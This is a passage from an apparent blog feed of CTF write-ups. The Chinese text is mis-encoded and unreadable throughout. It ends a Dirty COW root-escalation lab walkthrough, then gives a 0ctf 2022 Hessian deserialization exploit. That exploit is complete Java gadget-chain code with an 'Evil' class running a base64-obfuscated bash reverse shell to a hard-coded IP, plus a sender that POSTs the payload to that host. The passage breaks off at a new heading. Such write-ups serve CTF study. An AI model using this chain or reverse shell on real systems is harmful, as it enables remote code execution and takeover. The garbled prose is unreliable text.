¼å¼æ–‡ä»¶ï¼Œéœ€è¦å…ˆç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o shell 40847.cpp -lutil</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆåŠŸåä¼šç”Ÿæˆä¸€ä¸ªshellæ‰§è¡Œæ–‡ä»¶</p><p>æ‰§è¡Œdcowæ–‡ä»¶,è¿™é‡Œè¿˜éœ€æ³¨æ„éœ€è¦å…ˆè¿›å…¥ä¸€ä¸ªç”¨æˆ·æ‰èƒ½è¿›è¡Œææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shell -s</span><br></pre></td></tr></table></figure><p>æˆåŠŸææƒ</p><p><a href="https://imgse.com/i/ppARX0U"><img src="https://s1.ax1x.com/2023/03/04/ppARX0U.png" alt="ppARX0U.png"></a></p><p>æ”¹rootè´¦æˆ·å¯†ç </p><p><a href="https://imgse.com/i/ppARxk4"><img src="https://s1.ax1x.com/2023/03/04/ppARxk4.png" alt="ppARxk4.png"></a></p><p>sshä»¥rootç”¨æˆ·ç™»å½•ï¼Œæ‹¿åˆ°flag</p><p><a href="https://imgse.com/i/ppARztJ"><img src="https://s1.ax1x.com/2023/03/04/ppARztJ.png" alt="ppARztJ.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€é¶æœºæµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf_hessian-only-jdk</title>
      <link href="/2023/01/15/%5B0ctf%202022%5Dhessian-only-jdk/"/>
      <url>/2023/01/15/%5B0ctf%202022%5Dhessian-only-jdk/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-2022-hessian-only-jdk"><a href="#0ctf-2022-hessian-only-jdk" class="headerlink" title="[0ctf 2022]hessian-only-jdk"></a>[0ctf 2022]hessian-only-jdk</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‰ç½®</span><br><span class="line">1.https://y4er.com/posts/wangdingbei-badbean-hessian2/</span><br><span class="line">2.https://x-stream.github.io/CVE-2021-21346.html</span><br><span class="line">3.https://www.anquanke.com/post/id/234537</span><br><span class="line">4.https://xz.aliyun.com/t/11919</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªç®€å•æ˜äº†çš„ååºåˆ—åŒ–ç‚¹</p><p><a href="https://imgse.com/i/pC3HNKU"><img src="https://s1.ax1x.com/2023/06/20/pC3HNKU.png" alt="pC3HNKU.png"></a></p><p>ä¾èµ–æ˜¯åªæœ‰ä¸€ä¸ªhessianä¾èµ–</p><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h2><p>é¢„æœŸæ˜¯ä»<code>toString</code>å¼€å§‹ï¼Œ<a href="https://www.cnblogs.com/bitterz/p/15828415.html">CVE-2021-43297</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hessian2Input#readObject (com.caucho.hessian.io)</span><br><span class="line">Hessian2Input#readObjectDefinition (com.caucho.hessian.io)</span><br><span class="line">Hessian2Input#readString (com.caucho.hessian.io)</span><br><span class="line">Hessian2Input#expect (com.caucho.hessian.io)</span><br><span class="line">xxx#toString</span><br></pre></td></tr></table></figure><p>expectæ–¹æ³•ä¸­å­˜åœ¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œèƒ½è°ƒç”¨toString</p><p><a href="https://imgse.com/i/pC3Hs8x"><img src="https://s1.ax1x.com/2023/06/20/pC3Hs8x.png" alt="pC3Hs8x.png"></a></p><p>å¾€ä¸Šæ‰¾ï¼ŒreadStringé‡Œdefaultæ¡ä»¶ä¸‹ä¼šè°ƒç”¨expect</p><p><a href="https://imgse.com/i/pC3HLqg"><img src="https://s1.ax1x.com/2023/06/20/pC3HLqg.png" alt="pC3HLqg.png"></a></p><p>Hessian2Input#readObjectDefinition</p><p><a href="https://imgse.com/i/pC3LXZD"><img src="https://s1.ax1x.com/2023/06/20/pC3LXZD.png" alt="pC3LXZD.png"></a></p><p>Hessian2Input#readObject</p><p><a href="https://imgse.com/i/pC3OSJA"><img src="https://s1.ax1x.com/2023/06/20/pC3OSJA.png" alt="pC3OSJA.png"></a></p><p>åˆ°toStringçš„é“¾å°±æœ‰äº†</p><p>å†™ä¸ªMyBeanï¼ŒtoStringæ–¹æ³•ä¸‹ä¼šå¼¹å‡ºè®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">toStrTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">67</span>); <span class="comment">//&#x27;C&#x27;</span></span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>); <span class="comment">//ä¸ç”¨è¦æ±‚å®ç°java.io.Serializable</span></span><br><span class="line"></span><br><span class="line">        out.writeObject(myBean);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doPOST(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://127.0.0.1:8090/&quot;</span>);</span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span>&lt;&gt;(obj);</span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC3bsoj"><img src="https://s1.ax1x.com/2023/06/20/pC3bsoj.png" alt="pC3bsoj.png"></a></p><p>ä¸‹é¢çš„tostringé“¾æœ‰ä¸ªç°æˆçš„é“¾å­XStream<code>CVE-2021-21346</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.MultiUIDefaults#toString</span><br><span class="line">UIDefaults#get</span><br><span class="line">UIDefaults#getFromHashTable</span><br><span class="line">UIDefaults$LazyValue#createValue</span><br><span class="line">SwingLazyValue#createValue</span><br><span class="line">javax.naming.InitialContext#doLookup</span><br></pre></td></tr></table></figure><p>ä½†åœ¨è¿™ä¸ªé¢˜é‡Œé¢æ— æ³•åº”ç”¨</p><p>1ã€å› ä¸º<code>javax.swing.MultiUIDefaults</code>ä¸æ˜¯publicï¼Œåªèƒ½åœ¨<code>javax.swing.</code>ä¸­ä½¿ç”¨ï¼Œåœ¨hessian2æ‹¿åˆ°æ„é€ å™¨åï¼Œä¸èƒ½setAccessableï¼ŒnewInstanceå°±æ— æ³•è¿›è¡Œï¼Œéœ€è¦æ‰¾ä¸ªpublicçš„ç±»æ„é€ æ–°é“¾</p><p>2ã€<code>CVE-2021-21346</code> æœ€åè§¦å‘çš„æ˜¯ JNDI æ³¨å…¥ï¼Œéœ€è¦ jdk8 è¾ƒä½ç‰ˆæœ¬ï¼Œè€Œæ­¤é¢˜ onlyjdk ç‰ˆæœ¬ä¸º jdk1.8.342 å·²ç»è¶…è¿‡JNDIä½¿ç”¨èŒƒå›´</p><p>æ‰€ä»¥ç°åœ¨å¯å–çš„é“¾å­ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UIDefaults#get</span><br><span class="line">UIDefaults#getFromHashTable</span><br><span class="line">UIDefaults$LazyValue#createValue</span><br><span class="line">SwingLazyValue#createValue</span><br></pre></td></tr></table></figure><p><code>SwingLazyValue#createValue</code>å¯è°ƒç”¨ä»»æ„ç±»çš„å…¬å…±é™æ€æ–¹æ³•</p><p><a href="https://imgse.com/i/pCGK4pj"><img src="https://s1.ax1x.com/2023/06/21/pCGK4pj.png" alt="pCGK4pj.png"></a></p><p>éœ€è¦æ‰¾ç±»å»æ›¿æ¢<code>javax.swing.MultiUIDefaults#toString</code>ï¼Œä¹Ÿå°±æ˜¯ä»<code>toString</code>åˆ°<code>HashTable.get()</code>ï¼ˆ<code>UIDefaults extends Hashtable</code>ï¼‰æœ€åå†å»æ›¿æ¢<code>javax.naming.InitialContext#doLookup()</code>ï¼Œå½“ç„¶ï¼Œéœ€è¦åºåˆ—åŒ–çš„ç±»ä¸ç”¨å®ç°Serializableæ¥å£ï¼Œå› ä¸º<strong>Hessianå¯ä»¥ååºåˆ—åŒ–æœªå®ç° Serializable æ¥å£çš„ç±»</strong></p><h3 id="PKCS9Attributes-x3D-gt-JavaWrapper-mian"><a href="#PKCS9Attributes-x3D-gt-JavaWrapper-mian" class="headerlink" title="PKCS9Attributes &#x3D;&gt; JavaWrapper._mian"></a>PKCS9Attributes &#x3D;&gt; JavaWrapper._mian</h3><p>èµ·ç‚¹æ˜¯<code>sun.security.pkcs.PKCS9Attributes#toString</code></p><p><a href="https://imgse.com/i/pCGi1tx"><img src="https://s1.ax1x.com/2023/06/21/pCGi1tx.png" alt="pCGi1tx.png"></a></p><p><code>sun.security.pkcs.PKCS9Attributes#getAttribute</code></p><p><a href="https://imgse.com/i/pCGi3h6"><img src="https://s1.ax1x.com/2023/06/21/pCGi3h6.png" alt="pCGi3h6.png"></a></p><p>é‡Œé¢çš„<code>$this.attributes</code>æ­£å¥½æ˜¯ä¸ªHashtable</p><p><a href="https://imgse.com/i/pCGiYcD"><img src="https://s1.ax1x.com/2023/06/21/pCGiYcD.png" alt="pCGiYcD.png"></a></p><p>äºæ˜¯å‰é¢éƒ½èƒ½æ„é€ å¥½äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attributes;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">s</span> <span class="operator">=</span> createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line"></span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(classname,methodname, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;));</span><br><span class="line">        setFieldValue(s,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(s);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨åªéœ€æ‰¾ä¸ªæ–°çš„é™æ€æ–¹æ³•å³å¯</p><p>æ‰¾åˆ°<code>com.sun.org.apache.bcel.internal.util.JavaWrapper#_mian</code></p><p><a href="https://imgse.com/i/pCG07RI"><img src="https://s1.ax1x.com/2023/06/21/pCG07RI.png" alt="pCG07RI.png"></a></p><p>å®ä¾‹åŒ–ä¸€ä¸ªJavaWrapperï¼Œç„¶åè°ƒç”¨runMain</p><p>runMain</p><p><a href="https://imgse.com/i/pCG0Lsf"><img src="https://s1.ax1x.com/2023/06/21/pCG0Lsf.png" alt="pCG0Lsf.png"></a></p><p>å›å»çœ‹çœ‹class loderï¼Œåœ¨<code>_main</code>é‡Œå®ä¾‹åŒ–<code>JavaWrapper</code>æ—¶ä¼šè°ƒç”¨<code>getClassLoader</code></p><p><a href="https://imgse.com/i/pCGBkLT"><img src="https://s1.ax1x.com/2023/06/21/pCGBkLT.png" alt="pCGBkLT.png"></a></p><p>æ˜¯ä¸€ä¸ª<code>bcel classloader</code></p><p>é‚£ä¹ˆå°±å¯ä»¥å†™Expäº†</p><p><strong>Evil.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjcwLjIyMS4yMDYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attributes;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://81.70.221.206:8090/&quot;</span>);</span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span>&lt;&gt;(obj);</span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">withoutConstructor</span> <span class="operator">=</span> createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(test.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;));</span><br><span class="line"></span><br><span class="line">        setFieldValue(withoutConstructor,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeString(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        out.writeObject(withoutConstructor);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doPOST(baos.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCGDBC9"><img src="https://s1.ax1x.com/2023/06/21/pCGDBC9.png" alt="pCGDBC9.png"></a></p><h3 id="MimeTypeParameterList-x3D-gt-MethodUtil-invoke"><a href="#MimeTypeParameterList-x3D-gt-MethodUtil-invoke" class="headerlink" 